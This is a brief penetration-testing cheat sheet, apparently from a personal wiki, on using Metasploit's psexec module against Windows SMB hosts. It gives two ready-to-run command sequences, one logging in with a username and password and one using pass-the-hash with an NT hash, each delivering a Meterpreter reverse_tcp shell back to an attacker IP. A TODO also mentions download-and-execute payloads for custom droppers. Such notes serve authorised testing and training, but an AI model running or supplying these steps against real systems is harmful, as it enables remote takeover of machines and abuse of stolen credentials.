# Metasploit

TODO: show the steps when switching payload to `windows/download_exec` when deploying custom droppers especially stageless payloads.

Authenticate via username and password.

```
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/psexec) > set lhost <attacker_IP>

msf exploit(windows/smb/psexec) > set lport <PORT>

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set smbdomain <domain>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password>

msf exploit(windows/smb/psexec) > run
```

Authenticate via Pass The Hash

```
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/smb/psexec) > set lhost <attacker_IP>

msf exploit(windows/smb/psexec) > set lport <PORT>

msf exploit(windows/smb/psexec) > set rhosts <target_IP>

msf exploit(windows/smb/psexec) > set smbdomain <domain>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:<nt_hash>

msf exploit(windows/smb/psexec) > run
```

---
## References

- [SANS: Custom Payloads in Metasploit](https://www.sans.org/blog/custom-payloads-in-metasploit/)